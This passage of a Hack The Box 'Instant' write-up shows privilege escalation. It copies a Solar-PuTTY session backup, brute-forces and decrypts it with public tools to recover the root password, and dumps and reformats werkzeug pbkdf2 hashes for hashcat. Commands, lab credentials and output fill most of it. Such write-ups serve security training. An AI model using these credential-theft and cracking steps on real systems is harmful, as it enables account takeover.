State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
LISTEN 0      4096   127.0.0.53%lo:53        0.0.0.0:*
LISTEN 0      4096      127.0.0.54:53        0.0.0.0:*
LISTEN 0      128        127.0.0.1:8808      0.0.0.0:*    users:(("python3",pid=1338,fd=3))
LISTEN 0      128        127.0.0.1:8888      0.0.0.0:*    users:(("python3",pid=1334,fd=3))
LISTEN 0      511                *:80              *:*
LISTEN 0      4096               *:22              *:*
shirohige@instant:~$ ps auxfw5|grep 1338
shirohi+    1338  0.0  3.0 290256 60544 ?        Ss   15:04   0:01 /home/shirohige/projects/mywallet/myenv/bin/python3 serve.py
shirohi+   17045  0.0  0.1   3956  2048 pts/0    S+   17:36   0:00              \_ grep --color=auto 1338
```

What `development` owns

```bash
shirohige@instant:~$ find / -not -path "/proc/*" -not -path "/run/*" -not -path "/sys/*" -not -path "/var/lib/*" -group development -ls 2>/dev/null
shirohige@instant:~$ 
```

What `shirohige` owns

```bash
shirohige@instant:~$ find / -not -path "/proc/*" -not -path "/run/*" -not -path "/sys/*" -not -path "/var/lib/*" -user $(id -u -n) -ls 2>/dev/null
[...]
    56100      4 drwxr-xr-x   3 shirohige shirohige     4096 Oct  4 15:22 /opt/backups
    56101      4 drwxr-xr-x   2 shirohige shirohige     4096 Oct  4 15:22 /opt/backups/Solar-PuTTY
    55459      4 -rw-r--r--   1 shirohige shirohige     1100 Sep 30 11:38 /opt/backups/Solar-PuTTY/sessions-backup.dat
```

Download **Solar-PuTTY**'s session backup file

```bash
┌──(bravosec㉿fsociety)-[~/htb/Instant]
└─$ scp -i ./loot/shirohige.id_rsa shirohige@instant.htb:/opt/backups/Solar-PuTTY/sessions-backup.dat loot/
```

Do simple analyzations

```bash
┌──(bravosec㉿fsociety)-[~/htb/Instant]
└─$ file loot/sessions-backup.dat
loot/sessions-backup.dat: ASCII text, with very long lines (1100), with no line terminators

┌──(bravosec㉿fsociety)-[~/htb/Instant]
└─$ diec -a -b -r -d -u loot/sessions-backup.dat
Binary
    audio: SAM Coupe/E-Tracker file (.COP,.SNG)
    Format: plain text

┌──(bravosec㉿fsociety)-[~/htb/Instant]
└─$ cat loot/sessions-backup.dat
ZJlEkpkqLgj2PlzCyLk4gtCfsGO2CMirJoxxdpclYTlEshKzJwjMCwhDGZzNRr0fNJMlLWfpbdO7l2fEbSl/OzVAmNq0YO94RBxg9p4pwb4upKiVBhRY22HIZFzy6bMUw363zx6lxM4i9kvOB0bNd/4PXn3j3wVMVzpNxuKuSJOvv0fzY/ZjendafYt1Tz1VHbH4aHc8LQvRfW6Rn+5uTQEXyp4jE+ad4DuQk2fbm9oCSIbRO3/OKHKXvpO5Gy7db1njW44Ij44xDgcIlmNNm0m4NIo1Mb/2ZBHw/MsFFoq/TGetjzBZQQ/rM7YQI81SNu9z9VVMe1k7q6rDvpz1Ia7JSe6fRsBugW9D8GomWJNnTst7WUvqwzm29dmj7JQwp+OUpoi/j/HONIn4NenBqPn8kYViYBecNk19Leyg6pUh5RwQw8Bq+6/OHfG8xzbv0NnRxtiaK10KYh++n/Y3kC3t+Im/EWF7sQe/syt6U9q2Igq0qXJBF45Ox6XDu0KmfuAXzKBspkEMHP5MyddIz2eQQxzBznsgmXT1fQQHyB7RDnGUgpfvtCZS8oyVvrrqOyzOYl8f/Ct8iGbv/WO/SOfFqSvPQGBZnqC8Id/enZ1DRp02UdefqBejLW9JvV8gTFj94MZpcCb9H+eqj1FirFyp8w03VHFbcGdP+u915CxGAowDglI0UR3aSgJ1XIz9eT1WdS6EGCovk3na0KCz8ziYMBEl+yvDyIbDvBqmga1F+c2LwnAnVHkFeXVua70A4wtk7R3jn8+7h+3Evjc1vbgmnRjIp2sVxnHfUpLSEq4oGp3QK+AgrWXzfky7CaEEEUqpRB6knL8rZCx+Bvw5uw9u81PAkaI9SlY+60mMflf2r6cGbZsfoHCeDLdBSrRdyGVvAP4oY0LAAvLIlFZEqcuiYUZAEgXgUpTi7UvMVKkHRrjfIKLw0NUQsVY4LVRaa3rOAqUDSiOYn9F+Fau2mpfa3c2BZlBqTfL9YbMQhaaWz6VfzcSEbNTiBsWTTQuWRQpcPmNnoFN2VsqZD7d4ukhtakDHGvnvgr2TpcwiaQjHSwcMUFUawf0Oo2+yV3lwsBIUWvhQw2g= 
```

### Decrypt Solar-PuTTY session file

- Google : `Solar-PuTTY recover sessions backup dat`

> POC - https://github.com/VoidSec/SolarPuttyDecrypt

> Research paper - https://voidsec.com/solarputtydecrypt/

> Solar-PuTTY's session file can be recovered due to bad design
{: .prompt-info }

```bash
cd exploit
wget https://github.com/VoidSec/SolarPuttyDecrypt/releases/download/v1.0/SolarPuttyDecrypt_v1.zip
7z x SolarPuttyDecrypt_v1.zip -o'SolarPuttyDecrypt_v1'
```

The session file was encrypted

```bash
┌──(bravosec㉿fsociety)-[~/htb/Instant/exploit]
└─$ chmod +x ./SolarPuttyDecrypt_v1/SolarPuttyDecrypt.exe

┌──(bravosec㉿fsociety)-[~/htb/Instant/exploit]
└─$ ./SolarPuttyDecrypt_v1/SolarPuttyDecrypt.exe ../loot/sessions-backup.dat ""
-----------------------------------------------------
SolarPutty's Sessions Decrypter by VoidSec
-----------------------------------------------------
System.Security.Cryptography.CryptographicException: Bad PKCS7 padding. Invalid length 0.
  at Mono.Security.Cryptography.SymmetricTransform.ThrowBadPaddingException (System.Security.Cryptography.PaddingMode padding, System.Int32 length, System.Int32 position) [0x0005c] in <8611ac11d22247aabb4fd94490032492>:0
  at Mono.Security.Cryptography.SymmetricTransform.FinalDecrypt (System.Byte[] inputBuffer, System.Int32 inputOffset, System.Int32 inputCount) [0x00179] in <8611ac11d22247aabb4fd94490032492>:0
  at Mono.Security.Cryptography.SymmetricTransform.TransformFinalBlock (System.Byte[] inputBuffer, System.Int32 inputOffset, System.Int32 inputCount) [0x00034] in <8611ac11d22247aabb4fd94490032492>:0
  at System.Security.Cryptography.CryptoStream.FlushFinalBlock () [0x00016] in <8611ac11d22247aabb4fd94490032492>:0
  at System.Security.Cryptography.CryptoStream.Dispose (System.Boolean disposing) [0x00011] in <8611ac11d22247aabb4fd94490032492>:0
  at System.IO.Stream.Close () [0x00000] in <8611ac11d22247aabb4fd94490032492>:0
  at System.IO.Stream.Dispose () [0x00000] in <8611ac11d22247aabb4fd94490032492>:0
  at Crypto.Decrypt (System.String passPhrase, System.String cipherText) [0x000d2] in <63a09c062ee247439947006d799f7e91>:0
  at SolarPuttyDecrypt.Program.DoImport (System.String dialogFileName, System.String password, System.String CurrDir) [0x00019] in <63a09c062ee247439947006d799f7e91>:0
```

- Google : `crack SolarPutty session file`

> Tool - https://github.com/RainbowCache/solar_putty_crack

```bash
cd exploit
wget https://github.com/RainbowCache/solar_putty_crack/releases/download/release/linux-release.tar.gz
tar xzvf linux-release.tar.gz -C solar_putty_crack
```

The tool not only cracked the password of session file, but also decrypted its content

```bash
┌──(bravosec㉿fsociety)-[~/htb/Instant/exploit]
└─$ ./solar_putty_crack/sp_crack /opt/wordlists/rockyou.txt ../loot/sessions-backup.dat
Current platform cannot try to decrypt session data without password: Operation is not supported on this platform.
This is expected on Linux and MacOS. Will continue to try to decrypt with password.
Decrypted: {"Sessions":[{"Id":"066894ee-635c-4578-86d0-d36d4838115b","Ip":"10.10.11.37","Port":22,"ConnectionType":1,"SessionName":"Instant","Authentication":0,"CredentialsID":"452ed919-530e-419b-b721-da76cbe8ed04","AuthenticateScript":"00000000-0000-0000-0000-000000000000","LastTimeOpen":"0001-01-01T00:00:00","OpenCounter":1,"SerialLine":null,"Speed":0,"Color":"#FF176998","TelnetConnectionWaitSeconds":1,"LoggingEnabled":false,"RemoteDirectory":""}],"Credentials":[{"Id":"452ed919-530e-419b-b721-da76cbe8ed04","CredentialsName":"instant-root","Username":"root","Password":"12**24nzC!r0c%q12","PrivateKeyPath":"","Passphrase":"","PrivateKeyContent":null}],"AuthScript":[],"Groups":[],"Tunnels":[],"LogsFolderDestination":"C:\\ProgramData\\SolarWinds\\Logs\\Solar-PuTTY\\Sessio
Password founnd: estrella
```

Switch user to `root`

```bash
shirohige@instant:~/projects/mywallet/Instant-Api/mywallet$ su - root
Password:12**24nzC!r0c%q12
root@instant:~# id
uid=0(root) gid=0(root) groups=0(root)
root@instant:~# cat root.txt
07ac911f3c38662d80265ea6d0b0a350
```

# Additional
---

## (Rabbit hole) Crack werkzeug generated pbkdf2 hash

> This was a rabbit hole I encountered while looting `swagger-ui.instant.htb`'s API database
{: .prompt-info }

Loot **instant api**'s database

```bash
shirohige@instant:~/projects/mywallet/Instant-Api/mywallet$ grep -rin pass
swagger_configs/register.yml:47:      password:
swagger_configs/login.yml:37:      password:
swagger_configs/add_user.yml:43:      password:
app.py:2:from werkzeug.security import generate_password_hash, check_password_hash
app.py:52:        password = data['password']
app.py:56:            # check the password if matches
app.py:57:            if check_password_hash(user.password, password):
app.py:72:                "Description": "Wrong Password / Username"
app.py:87:        password = data['password']
app.py:99:            user = User(username, email, wall_id, generate_password_hash(password, method="pbkdf2"), str(datetime.now()), int(pin), "instantian", "active")
app.py:335:            password = data['password']
app.py:348:                user = User(username, email, wall_id, generate_password_hash(password, method='pbkdf2'), str(datetime.now()), int(secret_pin), role, "active")
serve.py:2:from werkzeug.security import generate_password_hash, check_password_hash
serve.py:38:                "password": {"type": "string"},
serve.py:42:            "required": ["username", "email", "password", "pin", "role"]
serve.py:100:                "password": {"type": "string"},
serve.py:103:            "required": ["username", "email", "password", "pin"]
serve.py:117:                "password": {"type": "string"}
serve.py:119:            "required": ["username", "password"]
serve.py:231:    description: Authenticate a user with username and password, returning an access token.
serve.py:255:        password = data['password']
serve.py:259:            # check the password if matches
serve.py:260:            if check_password_hash(user.password, password):
serve.py:275:                "Description": "Wrong Password / Username"
serve.py:324:        password = data['password']
serve.py:336:            user = User(username, email, wall_id, generate_password_hash(password, method="pbkdf2"), str(datetime.now()), int(pin), "instantian", "active")
serve.py:734:            password = data['password']
serve.py:747:                user = User(username, email, wall_id, generate_password_hash(password, method='pbkdf2'), str(datetime.now()), int(secret_pin), role, "active")
grep: __pycache__/models.cpython-312.pyc: binary file matches
models.py:12:    password = db.Column(db.String())
models.py:18:    def __init__(self, username, email, wallet_id, password, create_date, secret_pin, role, status):
models.py:22:        self.password = password
models.py:28:    def __repr__(self, username, email, wallet_id, password, create_date, secret_pin, role, status):
models.py:29:        return f"{self.username}:{self.email}:{self.wallet_id}:{self.password}:{self.create_date}:{self.secret_pin}:{self.role}:{self.status}"
models.py:31:    # def create_password_hash(password):
models.py:32:    #     return generate_password_hash(password, method="pbkdf2")
grep: instance/instant.db: binary file matches
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Instant]
└─$ scp -i ./loot/shirohige.id_rsa shirohige@instant.htb:/home/shirohige/projects/mywallet/Instant-Api/mywallet/instance/instant.db loot/
```

The hash is in the format of `pbkdf2:sha256:600000:$<salt>$<hash>`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Instant]
└─$ sqlite3 loot/instant.db .dump | grep 'INSERT INTO wallet_users'
INSERT INTO wallet_users VALUES(1,'instantAdmin','admin@instant.htb','f0eca6e5-783a-471d-9d8f-0162cbc900db','pbkdf2:sha256:600000$I5bFyb0ZzD69pNX8$e9e4ea5c280e0766612295ab9bff32e5fa1de8f6cbb6586fab7ab7bc762bd978','2024-07-23 00:20:52.529887',87348,'Admin','active');
INSERT INTO wallet_users VALUES(2,'shirohige','shirohige@instant.htb','458715c9-b15e-467b-8a3d-97bc3fcf3c11','pbkdf2:sha256:600000$YnRgjnim$c9541a8c6ad40bc064979bc446025041ffac9af2f762726971d8a28272c550ed','2024-08-08 20:57:47.909667',42845,'instantian','active');
```

The `generate_password_hash` was imported from `werkzeug.security`, so it's not a custom function

```bash
shirohige@instant:~/projects/mywallet/Instant-Api/mywallet$ grep -rn generate_password_hash
app.py:2:from werkzeug.security import generate_password_hash, check_password_hash
[...]
```

- **hashcat** requires `pbkdf2` hash to be in the format of : `sha256:<iterations>:<base64 salt>:<base64 hash>`

> https://hashcat.net/wiki/doku.php?id=example_hashes

![](/assets/obsidian/f70b209cccfb2308bca3e4021c0b4d0a.png)

Iterate through the hashes and make them meet the format

```bash
┌──(bravosec㉿fsociety)-[~/htb/Instant]
└─$ sqlite3 loot/instant.db .dump | grep 'INSERT INTO wallet_users' | awk -F, '{print $5}' | tr -d "'" | tee loot/instant.db.hash
pbkdf2:sha256:600000$I5bFyb0ZzD69pNX8$e9e4ea5c280e0766612295ab9bff32e5fa1de8f6cbb6586fab7ab7bc762bd978
pbkdf2:sha256:600000$YnRgjnim$c9541a8c6ad40bc064979bc446025041ffac9af2f762726971d8a28272c550ed

┌──(bravosec㉿fsociety)-[~/htb/Instant]
└─$ while IFS='$' read -r prefix salt hash; do a=$(echo -n "$salt"|base64 -w0); b=$(echo -n "$hash"|base64 -w0); echo "${prefix}:${a}:${b}"; done < loot/instant.db.hash | tee loot/instant.db.hash.hc
pbkdf2:sha256:600000:STViRnliMFp6RDY5cE5YOA==:ZTllNGVhNWMyODBlMDc2NjYxMjI5NWFiOWJmZjMyZTVmYTFkZThmNmNiYjY1ODZmYWI3YWI3YmM3NjJiZDk3OA==
pbkdf2:sha256:600000:WW5SZ2puaW0=:Yzk1NDFhOGM2YWQ0MGJjMDY0OTc5YmM0NDYwMjUwNDFmZmFjOWFmMmY3NjI3MjY5NzFkOGEyODI3MmM1NTBlZA==
```

Now it can be cracked by **hashcat**

```bash
hashcat loot/instant.db.hash.hc /opt/wordlists/rockyou.txt -m 10900 --user
```